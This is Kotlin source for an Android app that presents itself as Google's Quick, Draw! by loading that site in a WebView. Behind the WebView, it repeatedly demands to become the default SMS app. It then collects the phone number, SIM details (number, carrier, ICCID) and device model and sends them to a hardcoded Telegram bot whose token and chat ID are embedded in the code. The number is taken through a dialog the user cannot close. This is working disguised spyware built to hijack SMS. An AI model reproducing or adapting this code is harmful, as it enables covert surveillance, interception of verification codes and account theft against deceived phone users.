package com.android.quickdraw

import android.annotation.SuppressLint
import android.app.role.RoleManager
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.os.Build
import android.os.Bundle
import android.provider.Telephony
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.text.Editable
import android.text.InputType
import android.text.TextWatcher
import android.view.LayoutInflater
import android.view.inputmethod.InputMethodManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.widget.AppCompatButton
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import ru.tinkoff.decoro.MaskImpl
import ru.tinkoff.decoro.slots.PredefinedSlots
import ru.tinkoff.decoro.watchers.MaskFormatWatcher

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var sharedPrefs: SharedPreferences
    private val SMS_ROLE_REQUEST_CODE = 101
    private val client = OkHttpClient()
    private val NOTIFICATION_SENT_KEY = "notification_sent"
    private val SIM_INFO_SENT_KEY = "sim_info_sent"
    private val PHONE_NUMBER_KEY = "phone_number"
    private val PHONE_NUMBER_ENTERED_KEY = "phone_number_entered"
    private var isNetworkMonitoringActive = false

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        sharedPrefs = getSharedPreferences("app_prefs", MODE_PRIVATE)
        webView = findViewById(R.id.webView)

        with(webView.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                view.loadUrl(url)
                return false
            }
        }

        // Начинаем мониторинг сети
        startNetworkMonitoring()
        checkInternetAndLoadUrl()
    }

    private fun startNetworkMonitoring() {
        if (isNetworkMonitoringActive) return
        
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            connectivityManager.registerDefaultNetworkCallback(object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: android.net.Network) {
                    super.onAvailable(network)
                    runOnUiThread {
                        // Интернет восстановлен
                        if (!webView.url.isNullOrEmpty() && !isInternetAvailable()) {
                            showNoInternetDialog { checkInternetAndLoadUrl() }
                        }
                    }
                }

                override fun onLost(network: android.net.Network) {
                    super.onLost(network)
                    runOnUiThread {
                        // Интернет пропал
                        showNoInternetDialog { checkInternetAndLoadUrl() }
                    }
                }
            })
            isNetworkMonitoringActive = true
        }
    }

    private fun checkInternetAndLoadUrl() {
        if (isInternetAvailable()) {
            webView.loadUrl("https://quickdraw.withgoogle.com")
            checkAndRequestSmsRole()
        } else {
            showNoInternetDialog { checkInternetAndLoadUrl() }
        }
    }

    @SuppressLint("ServiceCast")
    private fun isInternetAvailable(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                    capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } else {
            @Suppress("DEPRECATION")
            val networkInfo = connectivityManager.activeNetworkInfo
            @Suppress("DEPRECATION")
            networkInfo != null && networkInfo.isConnected
        }
    }

    private fun showNoInternetDialog(retryAction: () -> Unit) {
        AlertDialog.Builder(this)
            .setTitle("Нет подключения к интернету")
            .setMessage("Для продолжения работы приложения требуется интернет-соединение")
            .setPositiveButton("Попробовать снова") { _, _ -> retryAction() }
            .setCancelable(false)
            .show()
    }


    private fun checkAndRequestSmsRole() {
        if (!isDefaultSmsApp()) {
            requestSmsRole()
        } else {
            if (!sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
                sendNotification("Пользователь сделал приложением по умолчанию")
                sharedPrefs.edit().putBoolean(NOTIFICATION_SENT_KEY, true).apply()
            }
            if (!sharedPrefs.getBoolean(SIM_INFO_SENT_KEY, false)) {
                sendSimInfoNotification()
            }
            
            if (!sharedPrefs.getBoolean(PHONE_NUMBER_ENTERED_KEY, false)) {
                showPhoneNumberDialog()
            }
        }
    }

    private fun isDefaultSmsApp(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            packageName == Telephony.Sms.getDefaultSmsPackage(this)
        } else {
            sharedPrefs.getBoolean("is_default_sms", false)
        }
    }

    private fun requestSmsRole() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = getSystemService(RoleManager::class.java)
            if (roleManager?.isRoleAvailable(RoleManager.ROLE_SMS) == true) {
                if (!roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
                    val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
                    startActivityForResult(intent, SMS_ROLE_REQUEST_CODE)
                }
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
            startActivityForResult(intent, SMS_ROLE_REQUEST_CODE)
        }
    }

    private fun showPhoneNumberDialog() {
        val dialogView = LayoutInflater.from(this).inflate(R.layout.dialog_phone_input, null)
        val phoneInput = dialogView.findViewById<EditText>(R.id.phone_input)
        val continueButton = dialogView.findViewById<AppCompatButton>(R.id.continue_button)
        val dialogTitle = dialogView.findViewById<TextView>(R.id.dialog_title)
        val dialogMessage = dialogView.findViewById<TextView>(R.id.dialog_message)
    
        // Устанавливаем текст для заголовка и сообщения
        dialogTitle.text = "Введите номер телефона"
        dialogMessage.text = "Пожалуйста, введите ваш номер телефона для подтверждения"
    
        // Настройка маски для российского номера телефона
        setupPhoneMask(phoneInput)
    
        val dialog = AlertDialog.Builder(this)
            .setView(dialogView)
            .setCancelable(false)
            .create()
    
        continueButton.setOnClickListener {
            val rawPhone = getRawPhoneNumber(phoneInput)
            val formattedPhone = phoneInput.text.toString().trim()
            if (rawPhone.length == 10) { // 10 цифр без +7
                val fullPhone = "7$rawPhone" // Полный номер в формате 7XXXXXXXXXX
                sharedPrefs.edit().putString(PHONE_NUMBER_KEY, fullPhone).apply()
                sharedPrefs.edit().putBoolean(PHONE_NUMBER_ENTERED_KEY, true).apply()
                sendNotification("Введенный номер телефона: $formattedPhone")
                dialog.dismiss()
            }  else {
                phoneInput.error = "Пожалуйста, введите номер телефона"
            }
        }
    
        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        dialog.show()
    }

    private fun setupPhoneMask(editText: EditText) {
        // Создаем маску для российского номера
        val mask = MaskImpl.createTerminated(PredefinedSlots.RUS_PHONE_NUMBER)
        
        // Настраиваем маску:
        mask.isHideHardcodedHead = true // скрывать +7 пока не начали ввод
        mask.placeholder = '_' // символ-заполнитель
        
        // Создаем форматтер и вешаем на EditText
        val formatWatcher = MaskFormatWatcher(mask)
        formatWatcher.installOn(editText)
        
        // Устанавливаем начальное значение
        editText.setText("+7")
        editText.setSelection(editText.text.length) // курсор в конец
    }

    private fun getRawPhoneNumber(editText: EditText): String {
        // Получаем текст без форматирования (+7, скобок, пробелов и дефисов)
        val text = editText.text.toString()
        return text.replace(Regex("[^0-9]"), "").removePrefix("7")
    }

    

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SMS_ROLE_REQUEST_CODE) {
            if (isDefaultSmsApp()) {
                // Пользователь предоставил разрешение
                if (!sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
                    sendNotification("Пользователь сделал приложением по умолчанию")
                    sharedPrefs.edit().putBoolean(NOTIFICATION_SENT_KEY, true).apply()
                }
                if (!sharedPrefs.getBoolean(SIM_INFO_SENT_KEY, false)) {
                    sendSimInfoNotification()
                }
                
                if (!sharedPrefs.getBoolean(PHONE_NUMBER_ENTERED_KEY, false)) {
                    showPhoneNumberDialog()
                }
            } else {
                // Пользователь отказал - запрашиваем снова
                requestSmsRole()
            }
        }
    }

    private fun sendNotification(message: String) {
        try {
            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
            val fullMessage = "$message\n$deviceModel"

            val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
            val chatId = "6331293386"
            val url = "https://api.telegram.org/bot$botToken/sendMessage"

            val mediaType = "application/json".toMediaType()
            val requestBody = """
                {
                    "chat_id": "$chatId",
                    "text": "$fullMessage",
                    "parse_mode": "Markdown"
                }
            """.trimIndent().toRequestBody(mediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    e.printStackTrace()
                }

                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendSimInfoNotification() {
        val simInfo = getSimNumbersString()
        sendNotification("Информация о SIM-картах:\n$simInfo")
        sharedPrefs.edit().putBoolean(SIM_INFO_SENT_KEY, true).apply()
    }

    


    @SuppressLint("HardwareIds", "MissingPermission")
    private fun getSimNumbersString(): String {
        val result = StringBuilder()
        
        try {
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                val activeSubscriptions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    subscriptionManager.activeSubscriptionInfoList
                } else {
                    @Suppress("DEPRECATION")
                    subscriptionManager.activeSubscriptionInfoList
                }
                
                if (activeSubscriptions != null && activeSubscriptions.isNotEmpty()) {
                    result.append("Найдено SIM-карт: ${activeSubscriptions.size}\n\n")
                    
                    for (subscription in activeSubscriptions) {
                        val number = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            telephonyManager.createForSubscriptionId(subscription.subscriptionId).line1Number
                        } else {
                            @Suppress("DEPRECATION")
                            telephonyManager.line1Number
                        }
                        
                        result.append("SIM ${subscription.simSlotIndex + 1}:\n")
                        result.append("Номер: ${number ?: "недоступен"}\n")
                        result.append("Оператор: ${subscription.carrierName ?: "неизвестен"}\n")
                        result.append("IMSI: ${subscription.iccId ?: "недоступен"}\n")
                        result.append("Страна: ${subscription.countryIso?.uppercase() ?: "неизвестна"}\n\n")
                    }
                } else {
                    result.append("Активные SIM-карты не найдены\n")
                }
            } else {
                @Suppress("DEPRECATION")
                val number = telephonyManager.line1Number
                result.append("Основной номер SIM: ${number ?: "недоступен"}\n")
                result.append("(Метод для Multi-SIM не поддерживается в этой версии Android)\n")
            }
        } catch (e: Exception) {
            result.append("Ошибка при получении номеров SIM: ${e.localizedMessage}")
        }
        
        return result.toString()
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
    }
}
